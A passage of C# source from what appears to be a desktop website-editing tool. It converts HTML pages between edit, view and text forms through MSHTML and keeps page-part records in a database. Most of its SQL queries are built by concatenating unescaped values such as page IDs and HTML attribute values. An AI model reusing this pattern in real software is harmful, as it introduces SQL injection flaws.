                HTMLDocumentClass hc = new HTMLDocumentClass();
                IHTMLDocument2 doc2 = hc;
                doc2.write("");
                doc2.close();
                IHTMLDocument4 doc4 = hc;
                IHTMLDocument2 doc = doc4.createDocumentFromUrl(filepath, "null");
                string headString = "";
                while (doc.readyState != "complete")
                {
                    System.Windows.Forms.Application.DoEvents();
                }
                IHTMLDocument3 doc3 = (IHTMLDocument3)doc;
                System.Windows.Forms.Application.DoEvents();
                //add&mod by maobb 20071116,for htmlall solution
                int docalllength = doc.all.length;
                string doctype = "";
                IHTMLElement htmlElement = null;
                for (int i = 0; i < docalllength; i++)
                {
                    IHTMLDOMNode cDonNode = (IHTMLDOMNode)(doc.all.item(i, 0));
                    if (cDonNode.nodeName.Equals("#comment"))
                    {
                        //解决doctype的不同设置在编辑模式下可能会有问题的问题，add&mod by maobb 2007-11-20
                        if (((IHTMLCommentElement)cDonNode).text.ToUpper().StartsWith("<!DOCTYPE"))
                            doctype += "<!--DSComment" + ((IHTMLCommentElement)cDonNode).text + "DSComment-->";
                        else
                            doctype += ((IHTMLCommentElement)cDonNode).text;
                    }
                    if (cDonNode.nodeName.ToUpper().Equals("HTML"))
                    {
                        htmlElement = (IHTMLElement)cDonNode;
                        break;
                    }
                }
                doc.charset = "UTF-8";
                //IHTMLElementCollection ieh = doc3.getElementsByTagName("head");
                //if (ieh.length > 0)
                //{
                //    //add utf-8 head
                //    if (((IHTMLElement)(ieh.item(0, 0))).outerHTML.ToUpper().IndexOf("CHARSET=UTF-8") <= 0)
                //    {
                //        IHTMLElementCollection iem=((IHTMLElement)(ieh.item(0, 0))).all;
                //        for(int i=0;i<iem.length;i++)
                //        {
                //            if(iem.item(i,0))
                //        }
                //            doc3
                //        ((IHTMLMetaElement)(ieh.item(0, 0))).;
                        
                         
                //        ((IHTMLElement)(ieh.item(0, 0))).outerHTML = "<HEAD><META HTTP-EQUIV=CONTENT-TYPE CONTENT=\"TEXT/HTML; CHARSET=UTF-8\">" + ((IHTMLElement)(ieh.item(0, 0))).innerHTML + "</HEAD>";
                //        //headString = "<head><META HTTP-EQUIV=CONTENT-TYPE CONTENT=\"TEXT/HTML; CHARSET=UTF-8\">" + ((IHTMLElement)(ieh.item(0, 0))).innerHTML + "</head>";
                //    }
                //}
                string sql = "delete from part_in_page where pageid='" + pageid + "'";
                globalConst.CurSite.SiteConn.execSql(sql);
                IHTMLElementCollection iec = doc3.getElementsByTagName("control");
                //int i;
                foreach (IHTMLElement ihe in iec)
                {
                    //IHTMLElement ihe=(IHTMLElement)iec.item(i,i);
                    //if(ihe.tagName.ToLower().Equals("span"))
                    //{
                    //maybe no height and width
                    //if (ihe.getAttribute("id", 0) != null && ihe.getAttribute("name", 0) != null && ihe.getAttribute("height", 0) != null && ihe.getAttribute("width", 0) != null)
                    if (ihe.getAttribute("id", 0) != null && ihe.getAttribute("name", 0) != null)
                    {
                        string iid = ihe.getAttribute("id", 0).ToString();
                        string iname = ihe.getAttribute("name", 0).ToString();
                        string iheight = ihe.getAttribute("height", 0) == null ? null : ihe.getAttribute("height", 0).ToString();
                        string iwidth = ihe.getAttribute("width", 0) == null ? null : ihe.getAttribute("width", 0).ToString();
                        if (iheight == null && iwidth == null) iwidth = "100%";
                        sql = "insert into part_in_page(pageid,partid)values('" + pageid + "','" + iid + "')";// and b.name='" + iname + "'";
                        globalConst.CurSite.SiteConn.execSql(sql);
                        sql = "select a.name as warename,b.partxml as partxml,b.asportal as asportal from controls a,parts b where a.id=b.controlid and b.id='" + iid + "'";// and b.name='" + iname + "'";
                        OleDbDataReader rdr = globalConst.CurSite.SiteConn.OpenRecord(sql);
                        if (rdr.Read())
                        {
                            //string ooo=globalConst.PageWare.getWareEditHead(iid,iname,iwidth,iheight) + "<table><tr><td></td></tr></table><div></div><div></div>" + globalConst.PageWare.getWareEditTail();
                            //ooo="<span><table><tr><td></td></tr></table><div></div><div></div></span>";
                            try
                            {
                                ihe.outerHTML = globalConst.PageWare.getControlEditHead(iid, iname, iwidth, iheight, rdr.GetString(0)) + PageWare.getPartHtml(iid, rdr.GetString(0), iname, rdr.GetString(1), rdr.GetInt32(2)) + globalConst.PageWare.getControlEditTail();
                            }
                            catch (Exception ex)
                            {
                                if (ex.Message.StartsWith("HRESULT"))
                                {
                                    //if parent element is <p> <td>...,span will accur error
                                    ihe.parentElement.outerHTML = ihe.parentElement.outerHTML.Replace(ihe.outerHTML, globalConst.PageWare.getControlEditHead(iid, iname, iwidth, iheight, rdr.GetString(0)) + PageWare.getPartHtml(iid, rdr.GetString(0), iname, rdr.GetString(1), rdr.GetInt32(2)) + globalConst.PageWare.getControlEditTail());
                                }
                            }
                            //ihe.outerHTML=ooo;
                        }
                        else
                        {
                            log.Error("Find unDefined <control> label in code ,deleted ,htmlstring is:" + ihe.outerHTML);
                            ihe.outerHTML = "";
                        }
                        rdr.Close();
                    }
                    //}
                }
                doc = (IHTMLDocument2)doc3;
                while (doc.readyState != "complete")
                {
                    System.Windows.Forms.Application.DoEvents();
                }
                file.Delete(filepath + "_edit.htm");
                //创建unicode文本
                //file.CreateText(filepath + "_edit.htm",str.EncodingConvert("<html>\r\n" + headString + doc.body.outerHTML + "\r\n</html>",Encoding.UTF8,Encoding.Unicode));
                //file.CreateText(filepath + "_edit.htm", "<html>\r\n" + headString + doc.body.outerHTML + "\r\n</html>");
                if (htmlElement != null)
                {
                    file.CreateText(filepath + "_edit.htm", doctype + "\r\n" + htmlElement.outerHTML);
                }
                else
                {
                    MsgBox.Error("Can not find HTML tag! Create edit failed!");
                }
            }
            catch (Exception ex)
            {
                new error(ex);
                return false;
            }
            globalConst.MdiForm.MainStatus.Text = "Construct Finished";
            return true;
        }
        public static bool constructViewPageFromText_Old(string pageid, string filepath)
        {
            globalConst.MdiForm.MainStatus.Text = "Constructing View Page From Text";
            System.ComponentModel.LicenseManager.Validate(typeof(SiteMatrix.forms.NewControl));
            try
            {
                HTMLDocumentClass hc = new HTMLDocumentClass();
                IHTMLDocument2 doc2 = hc;
                doc2.write("");
                doc2.close();
                IHTMLDocument4 doc4 = hc;
                IHTMLDocument2 doc = doc4.createDocumentFromUrl(filepath, "null");
                string headString = "";
                while (doc.readyState != "complete")
                {
                    System.Windows.Forms.Application.DoEvents();
                }
                IHTMLDocument3 doc3 = (IHTMLDocument3)doc;
                System.Windows.Forms.Application.DoEvents();
                //add&mod by maobb 20071116,for htmlall solution
                int docalllength = doc.all.length;
                string doctype = "";
                IHTMLElement htmlElement = null;
                for (int i = 0; i < docalllength; i++)
                {
                    IHTMLDOMNode cDonNode = (IHTMLDOMNode)(doc.all.item(i, 0));
                    if (cDonNode.nodeName.Equals("#comment"))
                    {
                        doctype += ((IHTMLCommentElement)cDonNode).text;
                    }
                    if (cDonNode.nodeName.ToUpper().Equals("HTML"))
                    {
                        htmlElement = (IHTMLElement)cDonNode;
                        break;
                    }
                }
                doc.charset = "UTF-8";
                //IHTMLElementCollection ieh = doc3.getElementsByTagName("head");
                //if (ieh.length > 0)
                //{
                //    //add utf-8 head
                //    if (((IHTMLElement)(ieh.item(0, 0))).outerHTML.IndexOf("CHARSET=UTF-8") <= 0)
                //    {
                //        headString = "<head><META HTTP-EQUIV=CONTENT-TYPE CONTENT=\"TEXT/HTML; CHARSET=UTF-8\">" + ((IHTMLElement)(ieh.item(0, 0))).innerHTML + "</head>";
                //    }
                //    else
                //    {
                //        headString = ((IHTMLElement)(ieh.item(0, 0))).outerHTML;
                //    }
                //}

                IHTMLElementCollection iec = doc3.getElementsByTagName("control");
                //int i;
                foreach (IHTMLElement ihe in iec)
                {
                    //IHTMLElement ihe=(IHTMLElement)iec.item(i,i);
                    //if(ihe.tagName.ToLower().Equals("span"))
                    //{
                    if (ihe.getAttribute("id", 0) != null && ihe.getAttribute("name", 0) != null && ihe.getAttribute("height", 0) != null && ihe.getAttribute("width", 0) != null)
                    {
                        string iid = ihe.getAttribute("id", 0).ToString();
                        string iname = ihe.getAttribute("name", 0).ToString();
                        string iheight = ihe.getAttribute("height", 0).ToString();
                        string iwidth = ihe.getAttribute("width", 0).ToString();
                        string sql = "select a.name as warename,b.partxml as partxml,b.asportal as asportal from controls a,parts b where a.id=b.controlid and b.id='" + iid + "'";// and b.name='" + iname + "'";
                        OleDbDataReader rdr = globalConst.CurSite.SiteConn.OpenRecord(sql);
                        if (rdr.Read())
                        {
                            //ihe.outerHTML=globalConst.PageWare.getWareViewHead(iwidth,iheight) + PageWare.getPartHtml(iid,rdr.GetString(0),iname,rdr.GetString(1)) + globalConst.PageWare.getWareViewTail();
                            try
                            {
                                ihe.outerHTML = globalConst.PageWare.getControlViewHead(iwidth, iheight) + PageWare.getPartHtml(iid, rdr.GetString(0), iname, rdr.GetString(1), rdr.GetInt32(2)) + globalConst.PageWare.getControlViewTail();
                            }
                            catch (Exception ex)
                            {
                                if (ex.Message.StartsWith("HRESULT"))
                                {
                                    //if parent element is <p> <td>...,span will accur error
                                    ihe.parentElement.outerHTML = ihe.parentElement.outerHTML.Replace(ihe.outerHTML, globalConst.PageWare.getControlEditHead(iid, iname, iwidth, iheight, rdr.GetString(0)) + PageWare.getPartHtml(iid, rdr.GetString(0), iname, rdr.GetString(1), rdr.GetInt32(2)) + globalConst.PageWare.getControlEditTail());
                                }
                            }
                        }
                        else
                        {
                            log.Error("Find unDefined <control> label in code ,deleted ,htmlstring is:" + ihe.outerHTML);
                            ihe.outerHTML = "";
                        }
                        rdr.Close();
                    }
                    //}
                }
                doc = (IHTMLDocument2)doc3;
                while (doc.readyState != "complete")
                {
                    System.Windows.Forms.Application.DoEvents();
                }
                file.Delete(filepath + "_view.htm");
                //创建unicode文本
                //file.CreateText(filepath + "_edit.htm",str.EncodingConvert("<html>\r\n" + headString + doc.body.outerHTML + "\r\n</html>",Encoding.UTF8,Encoding.Unicode));
                //file.CreateText(filepath + "_view.htm", "<html>\r\n" + headString + doc.body.outerHTML + "\r\n</html>");
                if (htmlElement != null)
                {
                    file.CreateText(filepath + "_view.htm", doctype + "\r\n" + htmlElement.outerHTML);
                }
                else
                {
                    MsgBox.Error("Can not find HTML tag! Create view failed!");
                }
            }
            catch (Exception ex)
            {
                new error(ex);
                return false;
            }
            globalConst.MdiForm.MainStatus.Text = "Construct Finished";
            return true;
        }
        public static bool constructTextPageFromText(string pageid, string filepath)
        {
            globalConst.MdiForm.MainStatus.Text = "Constructing Text Page From Text";
            System.ComponentModel.LicenseManager.Validate(typeof(SiteMatrix.forms.NewControl));
            try
            {
                string filetext = file.getFileText(filepath, System.Text.Encoding.Default);
                file.Delete(filepath);
                //创建 utf-8 文本
                file.CreateText(filepath, filetext);
            }
            catch (Exception ex)
            {
                new error(ex);
                return false;
            }
            globalConst.MdiForm.MainStatus.Text = "Construct Finished";
            return true;
        }
        public static string getTextFromEdit(string EditString)
        {
            System.ComponentModel.LicenseManager.Validate(typeof(SiteMatrix.forms.NewControl));
            try
            {
                string filepath = globalConst.ConfigPath + @"\tagedit.tmp";
                file.Delete(filepath);
                file.CreateText(filepath, "<html><body><head><META HTTP-EQUIV=CONTENT-TYPE CONTENT=\"TEXT/HTML; CHARSET=UTF-8\"></head>" + EditString + "</body></html>");
                HTMLDocumentClass hc = new HTMLDocumentClass();
                IHTMLDocument2 doc2 = hc;
                doc2.write("");
                doc2.close();
                IHTMLDocument4 doc4 = hc;
                IHTMLDocument2 doc = doc4.createDocumentFromUrl(filepath, "null");

                while (doc.readyState != "complete")
                {
                    System.Windows.Forms.Application.DoEvents();
                }
                IHTMLDocument3 doc3 = (IHTMLDocument3)doc;
                System.Windows.Forms.Application.DoEvents();
                IHTMLElementCollection iec = doc3.getElementsByTagName("span");
                foreach (IHTMLElement ihe in iec)
                {
                    if (ihe.getAttribute("id", 0) != null && ihe.getAttribute("name", 0) != null)
                    {
                        if (ihe.getAttribute("id", 0).ToString().Equals("dotforsitecom") && ihe.getAttribute("name", 0).ToString().Equals("dotforsitecom"))
                        {
                            string replaceNode = "";
                            if (ihe.style.width == null || ihe.style.height == null)
                                replaceNode = "<dotforsite:control id=\"" + ihe.getAttribute("idname", 0).ToString() + "\" name=\"" + ihe.getAttribute("partname", 0).ToString() + "\" width=\"100\" height=\"100\"/>";
                            else
                                replaceNode = "<dotforsite:control id=\"" + ihe.getAttribute("idname", 0).ToString() + "\" name=\"" + ihe.getAttribute("partname", 0).ToString() + "\" width=\"" + ihe.style.width.ToString() + "\" height=\"" + ihe.style.height.ToString() + "\"/>";
                            ihe.outerHTML = replaceNode;
                        }
                    }
                }
                doc = (IHTMLDocument2)doc3;
                while (doc.readyState != "complete")
                {
                    System.Windows.Forms.Application.DoEvents();
                }
                return doc.body.innerHTML;
            }
            catch (Exception ex)
            {
                new error(ex);
                return EditString;
            }
        }
        public static string getEditFromText(string TextString,bool IsOut=true)
        {
            System.ComponentModel.LicenseManager.Validate(typeof(SiteMatrix.forms.NewControl));
            try
            {
                string filepath = globalConst.ConfigPath + @"\tagedit.tmp";
                file.Delete(filepath);
                file.CreateText(filepath, "<html><head><META HTTP-EQUIV=CONTENT-TYPE CONTENT=\"TEXT/HTML; CHARSET=UTF-8\"></head><body>" + TextString + "</body></html>");
                HTMLDocumentClass hc = new HTMLDocumentClass();
                IHTMLDocument2 doc2 = hc;
                doc2.write("");
                doc2.close();
                IHTMLDocument4 doc4 = hc;
                IHTMLDocument2 doc = doc4.createDocumentFromUrl(filepath, "null");
                while (doc.readyState != "complete")
                {
                    System.Windows.Forms.Application.DoEvents();
                }
                IHTMLDocument3 doc3 = (IHTMLDocument3)doc;
                System.Windows.Forms.Application.DoEvents();
                
                IHTMLElementCollection iec = doc3.getElementsByTagName("control");

                foreach (IHTMLElement ihe in iec)
                {
                    if (ihe.getAttribute("id", 0) != null && ihe.getAttribute("name", 0) != null && ihe.getAttribute("height", 0) != null && ihe.getAttribute("width", 0) != null)
                    {
                        string iid = ihe.getAttribute("id", 0).ToString();
                        string iname = ihe.getAttribute("name", 0).ToString();
                        string iheight = ihe.getAttribute("height", 0).ToString();
                        string iwidth = ihe.getAttribute("width", 0).ToString();
                        string sql = "select a.name as warename,b.partxml as partxml,b.asportal as asportal from controls a,parts b where a.id=b.controlid and b.id='" + iid + "'";// and b.name='" + iname + "'";
                        OleDbDataReader rdr = globalConst.CurSite.SiteConn.OpenRecord(sql);
                        if (rdr.Read())
                        {
                            try
                            {
                                ihe.outerHTML = globalConst.PageWare.getControlEditHead(iid, iname, iwidth, iheight, rdr.GetString(0)) + PageWare.getPartHtml(iid, rdr.GetString(0), iname, rdr.GetString(1), rdr.GetInt32(2)) + globalConst.PageWare.getControlEditTail();
                            }
                            catch (Exception ex)
                            {
                                if (ex.Message.StartsWith("HRESULT"))
                                {
                                    //if parent element is <p> <td>...,span will accur error
                                    ihe.parentElement.outerHTML = ihe.parentElement.outerHTML.Replace(ihe.outerHTML, globalConst.PageWare.getControlEditHead(iid, iname, iwidth, iheight, rdr.GetString(0)) + PageWare.getPartHtml(iid, rdr.GetString(0), iname, rdr.GetString(1), rdr.GetInt32(2)) + globalConst.PageWare.getControlEditTail());
                                }
                            }
                        }
                        else
                        {
                            log.Error("Find unDefined <control> label in code ,deleted ,htmlstring is:" + ihe.outerHTML);
                            ihe.outerHTML = "";
                        }
                        rdr.Close();
                    }
                }
                doc = (IHTMLDocument2)doc3;
                while (doc.readyState != "complete")
                {
                    System.Windows.Forms.Application.DoEvents();
                }
                if (IsOut) return doc.body.innerHTML;
                else
                {
                    string s = doc.body.innerHTML;
                    int indexStart = s.IndexOf(">") + 1;
                    int indexEnd = s.LastIndexOf("<")-1;
                    return s.Substring(indexStart, indexEnd- indexStart+1);
                }
            }
            catch (Exception ex)
            {
                new error(ex);
                if (IsOut) return TextString;
                else return null;
            }
        }
        public static bool constructTextPageFromEdit(string pageid, string filepath)
        {
            globalConst.MdiForm.MainStatus.Text = "Constructing Text Page From Edit";
            System.ComponentModel.LicenseManager.Validate(typeof(SiteMatrix.forms.NewControl));
            try
            {
                HTMLDocumentClass hc = new HTMLDocumentClass();
                IHTMLDocument2 doc2 = hc;
                doc2.write("");
                doc2.close();
                IHTMLDocument4 doc4 = hc;
                IHTMLDocument2 doc = doc4.createDocumentFromUrl(filepath + "_edit.htm", "null");
                string headString = "";
                while (doc.readyState != "complete")
                {
                    System.Windows.Forms.Application.DoEvents();
                }
                //解决切换时createDocumentFromUrl 造成的纯中文Title 丢失的问题。
                if (doc.title != null && !doc.title.EndsWith("\r\n"))
                {
                    doc.title += "\r\n";
                }
                IHTMLDocument3 doc3 = (IHTMLDocument3)doc;
                System.Windows.Forms.Application.DoEvents();
                //MsgBox.Information(((IHTMLElement)(doc.all.item(0, 0))).outerHTML);
                //add by maobb 20071116,for htmlall solution
                int docalllength = doc.all.length;
                string doctype = "";
                IHTMLElement htmlElement = null;
                for (int i = 0; i < docalllength; i++)
                {
                    IHTMLDOMNode cDonNode = (IHTMLDOMNode)(doc.all.item(i, 0));
                    if (cDonNode.nodeName.Equals("#comment"))
                    {
                        //解决doctype的不同设置在编辑模式下可能会有问题的问题，add&mod by maobb 2007-11-20
                        if (((IHTMLCommentElement)cDonNode).text.StartsWith("<!--DSComment"))
                            doctype += ((IHTMLCommentElement)cDonNode).text.Replace("<!--DSComment", "").Replace("DSComment-->", "");
                        else if (!((IHTMLCommentElement)cDonNode).text.StartsWith("<!DOCTYPE"))
                            doctype += ((IHTMLCommentElement)cDonNode).text;
                    }
                    if (cDonNode.nodeName.ToUpper().Equals("HTML"))
                    {
                        htmlElement = (IHTMLElement)cDonNode;
                        break;
                    }
                }
                doc.charset = "UTF-8";
                //IHTMLElementCollection ieh = doc3.getElementsByTagName("head");
                //if (ieh.length > 0)
                //{
                //    headString = ((IHTMLElement)(ieh.item(0, 0))).outerHTML;
                //    //headString=headString.Replace("CHARSET=UTF-8","CHARSET=DotForSite.Default");
                //}
                string sql = "delete from part_in_page where pageid='" + pageid + "'";
                globalConst.CurSite.SiteConn.execSql(sql);
                IHTMLElementCollection iec = doc3.getElementsByTagName("span");
                //int i;
                foreach (IHTMLElement ihe in iec)
                {
                    //IHTMLElement ihe=(IHTMLElement)iec.item(i,i);
                    //if(ihe.tagName.ToLower().Equals("span"))
                    //{
                    if (ihe.getAttribute("id", 0) != null && ihe.getAttribute("name", 0) != null)
                    {
                        if (ihe.getAttribute("id", 0).ToString().Equals("dotforsitecom") && ihe.getAttribute("name", 0).ToString().Equals("dotforsitecom"))
                        {
                            string replaceNode = "";
                            sql = "insert into part_in_page(pageid,partid)values('" + pageid + "','" + ihe.getAttribute("idname", 0).ToString() + "')";// and b.name='" + iname + "'";
                            globalConst.CurSite.SiteConn.execSql(sql);
                            //if (ihe.style.width == null || ihe.style.height == null)
                            //    replaceNode = "<dotforsite:control id=\"" + ihe.getAttribute("idname", 0).ToString() + "\" name=\"" + ihe.getAttribute("partname", 0).ToString() + "\" width=\"100\" height=\"100\"/>";
                            //else
                            //    replaceNode = "<dotforsite:control id=\"" + ihe.getAttribute("idname", 0).ToString() + "\" name=\"" + ihe.getAttribute("partname", 0).ToString() + "\" width=\"" + ihe.style.width.ToString() + "\" height=\"" + ihe.style.height.ToString() + "\"/>";
                            //可能没设定宽高
                            replaceNode = "<dotforsite:control id=\"" + ihe.getAttribute("idname", 0).ToString() + "\" name=\"" + ihe.getAttribute("partname", 0).ToString() + "\"" + (ihe.style.width == null?"": " width=\"" + ihe.style.width.ToString() + "\"") + (ihe.style.height == null?"": " height=\"" + ihe.style.height.ToString() + "\"") + "/>";
                            ihe.outerHTML = replaceNode;
                        }
                    }
                    //}
                }
                doc = (IHTMLDocument2)doc3;
                while (doc.readyState != "complete")
                {
                    System.Windows.Forms.Application.DoEvents();
                }
                file.Delete(filepath);
                //创建 utf-8 文本
                //file.CreateText(filepath, "<HTML>\r\n" + headString + doc.body.outerHTML + "\r\n</HTML>");
                if (htmlElement != null)
                {
                    file.CreateText(filepath, doctype + "\r\n" + htmlElement.outerHTML);
                }
                else
                {
                    MsgBox.Error("Can not find HTML tag! Create text failed!");
                }
                sql = "update pages set updatetime='" + DateTime.Now + "' where id='" + pageid + "'";
                globalConst.CurSite.SiteConn.execSql(sql);
            }
            catch (Exception ex)
            {
                new error(ex);
                return false;
            }
            globalConst.MdiForm.MainStatus.Text = "Construct Finished";
            return true;
        }
        public static bool constructViewPageFromEdit(string pageid, string filepath)
        {
            globalConst.MdiForm.MainStatus.Text = "Constructing View Page From Edit";
            System.ComponentModel.LicenseManager.Validate(typeof(SiteMatrix.forms.NewControl));
            try
            {
                HTMLDocumentClass hc = new HTMLDocumentClass();
                IHTMLDocument2 doc2 = hc;
                doc2.write("");
                doc2.close();
                IHTMLDocument4 doc4 = hc;
                IHTMLDocument2 doc = doc4.createDocumentFromUrl(filepath + "_edit.htm", "null");
                string headString = "";
                while (doc.readyState != "complete")
                {
                    System.Windows.Forms.Application.DoEvents();
                }
                IHTMLDocument3 doc3 = (IHTMLDocument3)doc;
                System.Windows.Forms.Application.DoEvents();
                //add&mod by maobb 20071116,for htmlall solution
                int docalllength = doc.all.length;
                string doctype = "";
                IHTMLElement htmlElement = null;
                for (int i = 0; i < docalllength; i++)
                {
                    IHTMLDOMNode cDonNode = (IHTMLDOMNode)(doc.all.item(i, 0));
                    if (cDonNode.nodeName.Equals("#comment"))
                    {
                        //解决doctype的不同设置在编辑模式下可能会有问题的问题，add&mod by maobb 2007-11-20
                        if (((IHTMLCommentElement)cDonNode).text.StartsWith("<!--DSComment"))
                            doctype += ((IHTMLCommentElement)cDonNode).text.Replace("<!--DSComment", "").Replace("DSComment-->", "");
                        else if (!((IHTMLCommentElement)cDonNode).text.StartsWith("<!DOCTYPE"))
                            doctype += ((IHTMLCommentElement)cDonNode).text;
                    }
                    if (cDonNode.nodeName.ToUpper().Equals("HTML"))
                    {
                        htmlElement = (IHTMLElement)cDonNode;
                        break;
                    }
                }
                doc.charset = "UTF-8";
                //IHTMLElementCollection ieh = doc3.getElementsByTagName("head");
                //if (ieh.length > 0)
                //{
                //    headString = ((IHTMLElement)(ieh.item(0, 0))).outerHTML;
                //    //edit to view must have utf-8 label
                //    //headString=headString.Replace("CHARSET=UTF-8","CHARSET=DotForSite.Default");
                //}
                IHTMLElementCollection iec = doc3.getElementsByTagName("span");
                //int i;
                foreach (IHTMLElement ihe in iec)
                {
                    //IHTMLElement ihe=(IHTMLElement)iec.item(i,i);
                    //if(ihe.tagName.ToLower().Equals("span"))
                    //{
                    if (ihe.getAttribute("id", 0) != null && ihe.getAttribute("name", 0) != null)
                    {
                        if (ihe.getAttribute("id", 0).ToString().Equals("dotforsitecom") && ihe.getAttribute("name", 0).ToString().Equals("dotforsitecom"))
                        {
                            string viewStyleWidth = ihe.style.width.ToString();
                            string viewStyleHeight = ihe.style.height.ToString();
                            ihe.removeAttribute("id", 0);
                            ihe.removeAttribute("contentEditable", 0);
                            ihe.removeAttribute("style", 0);
                            ihe.removeAttribute("name", 0);
                            ihe.removeAttribute("partname", 0);
                            ihe.removeAttribute("idname", 0);
                            ihe.style.width = viewStyleWidth;
                            ihe.style.height = viewStyleHeight;
                        }
                    }
                    //}
                }
                doc = (IHTMLDocument2)doc3;
                while (doc.readyState != "complete")
                {
                    System.Windows.Forms.Application.DoEvents();
                }
                file.Delete(filepath + "_view.htm");
                //创建 utf-8 文本
                //file.CreateText(filepath + "_view.htm", "<html>\r\n" + headString + doc.body.outerHTML + "\r\n</html>");
                if (htmlElement != null)
                {
                    file.CreateText(filepath + "_view.htm", doctype + "\r\n" + htmlElement.outerHTML);
                }
                else
                {
                    MsgBox.Error("Can not find HTML tag! Create view failed!");
                }
            }
            catch (Exception ex)
            {
                new error(ex);
                return false;
            }
            globalConst.MdiForm.MainStatus.Text = "Construct Finished";
            return true;
        }
        
        
        public static void InsertLastList(string Type,string Value)
        {
            Value = Value.Replace("'", "''");
            string sql = "select count(*) as countall from lastlist where thetype='" + Type + "' and thevalue='" + Value + "'";
            if (globalConst.ConfigConn.GetInt32(sql) == 0)
            {
                sql = "update lastlist set id=id+1 where thetype='" + Type + "'";
                globalConst.ConfigConn.execSql(sql);
                sql = "update lastlist set id=0 where thetype='" + Type + "' and id=8";
                globalConst.ConfigConn.execSql(sql);
                sql = "update lastlist set thevalue='" + Value + "' where thetype='" + Type + "' and id=0";
                globalConst.ConfigConn.execSql(sql);
                globalConst.MdiForm.RefreshLastListMenus();
            }
        }
        public static void close()
        {
            if (globalConst.CurSite.ID == null) return;
            System.ComponentModel.LicenseManager.Validate(typeof(SiteMatrix.forms.NewControl));
            try
            {
                int i;
                Form[] fms = globalConst.MdiForm.MdiChildren;
                for (i = 0; i < fms.Length; i++)
                {
                    if (fms[i].Name.Equals("Editor"))
                    {
                        if (!((Editor)fms[i]).isFreeFile)
                        {
                            fms[i].Close();
                        }
                    }
                }
                fms = null;
                InsertLastList("site", globalConst.CurSite.ID + "[" + globalConst.CurSite.Domain + "]");
                globalConst.CurSite.ID = null;
                globalConst.CurSite.Domain = null;
                globalConst.CurSite.Caption = null;
                globalConst.CurSite.Path = null;
                globalConst.CurSite.URL = null;
                globalConst.CurSite.FormDataXML = null;
                try
                {
                    globalConst.CurSite.SiteConn.Close();
                    globalConst.CurSite.SiteConn2.Close();
                }
                catch (Exception e)
                {
                    log.Debug("db.Close Exception:" + e.Message, "{site.close()}");
                }
                globalConst.MdiForm.SiteTree.Nodes.Clear();
                globalConst.MdiForm.SiteTree.Enabled = false;
                globalConst.MdiForm.ControlTree.Nodes.Clear();
                globalConst.MdiForm.ControlTree.Enabled = false;
                globalConst.MdiForm.PropGrid.SelectedObject = null;
                globalConst.MdiForm.ProOthers.Enabled = false;
                globalConst.MdiForm.CurPropTag.Enabled = false;
                globalConst.MdiForm.WorkSpaceSiteTool.Enabled = false;
                globalConst.MdiForm.WorkSpaceControlTool.Enabled = false;
                globalConst.MdiForm.UpdateMenusAndToolBars4Site();
                FormData.TheFormData = null;
            }
            catch (Exception ex)
            {
                new error(ex);
            }
        }
        public static void RefreshPartInPageFromText(string pageid, string filepath)
        {
            try
            {
                HTMLDocumentClass hc = new HTMLDocumentClass();
                IHTMLDocument2 doc2 = hc;
                doc2.write("");
                doc2.close();
                IHTMLDocument4 doc4 = hc;
                IHTMLDocument2 doc = doc4.createDocumentFromUrl(filepath, "null");
                while (doc.readyState != "complete")
                {
                    System.Windows.Forms.Application.DoEvents();
                }
                IHTMLDocument3 doc3 = (IHTMLDocument3)doc;
                System.Windows.Forms.Application.DoEvents();
                string sql = "delete from part_in_page where pageid='" + pageid + "'";
                globalConst.CurSite.SiteConn.execSql(sql);
                IHTMLElementCollection iec = doc3.getElementsByTagName("control");
                //int i;
                foreach (IHTMLElement ihe in iec)
                {
                    //IHTMLElement ihe=(IHTMLElement)iec.item(i,i);
                    //if(ihe.tagName.ToLower().Equals("span"))
                    //{
                    if (ihe.getAttribute("id", 0) != null)
                    {
                        string iid = ihe.getAttribute("id", 0).ToString();
                        sql = "insert into part_in_page(pageid,partid)values('" + pageid + "','" + iid + "')";// and b.name='" + iname + "'";
                        globalConst.CurSite.SiteConn.execSql(sql);
                    }
                    //}
                }
            }
            catch (Exception ex)
            {
                new error(ex);
            }
        }
        public static void RefreshPartInPageFromEdit(string pageid, string filepath)
        {
            try
            {
                HTMLDocumentClass hc = new HTMLDocumentClass();
                IHTMLDocument2 doc2 = hc;
                doc2.write("");
                doc2.close();
                IHTMLDocument4 doc4 = hc;
                IHTMLDocument2 doc = doc4.createDocumentFromUrl(filepath + "_edit.htm", "null");
                while (doc.readyState != "complete")
                {
                    System.Windows.Forms.Application.DoEvents();
                }
                IHTMLDocument3 doc3 = (IHTMLDocument3)doc;
                System.Windows.Forms.Application.DoEvents();
                string sql = "delete from part_in_page where pageid='" + pageid + "'";
                globalConst.CurSite.SiteConn.execSql(sql);
                IHTMLElementCollection iec = doc3.getElementsByTagName("span");
                //int i;
                foreach (IHTMLElement ihe in iec)
                {
                    if (ihe.getAttribute("id", 0) != null && ihe.getAttribute("name", 0) != null)
                    {
                        if (ihe.getAttribute("id", 0).ToString().Equals("dotforsitecom") && ihe.getAttribute("name", 0).ToString().Equals("dotforsitecom"))
                        {
                            string iid = ihe.getAttribute("idname", 0).ToString();
                            sql = "insert into part_in_page(pageid,partid)values('" + pageid + "','" + iid + "')";// and b.name='" + iname + "'";
                            globalConst.CurSite.SiteConn.execSql(sql);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                new error(ex);
            }
        }
        public static bool Import(string siteid,System.Windows.Forms.Label stat, string filename)
        {
            try
            {
                stat.Text = res._site.GetString("s1");
                Application.DoEvents();
                if (dir.Exists(globalConst.AppPath + @"\temp"))
                {
                    dir.Delete(globalConst.AppPath + @"\temp", true);
                }
                dir.CreateDirectory(globalConst.AppPath + @"\temp");

                new ZipClass().UnZip(filename, globalConst.AppPath + @"\temp\site\");


                stat.Text = res._site.GetString("s2");
                Application.DoEvents();
                file.Copy(globalConst.AppPath + @"\temp\site\site.db", globalConst.ConfigPath + @"\site_" + siteid + ".db", true);
                if (file.Exists(globalConst.AppPath + @"\temp\site\formtable.xml"))
                {
                    file.Copy(globalConst.AppPath + @"\temp\site\formtable.xml", globalConst.ConfigPath + @"\" + siteid + "_formtable.xml", true);
                }

                stat.Text = res._site.GetString("s3");
                Application.DoEvents();
                FileInfo[] fis;
                if (dir.Exists(globalConst.AppPath + @"\temp\site\index"))
                {
                    fis = new DirectoryInfo(globalConst.AppPath + @"\temp\site\index").GetFiles();
                    foreach (FileInfo fi in fis)
                    {
                        fi.CopyTo(globalConst.LibPath + @"\" + fi.Name, true);
                    }
                }

                stat.Text = res._site.GetString("s4");
                Application.DoEvents();

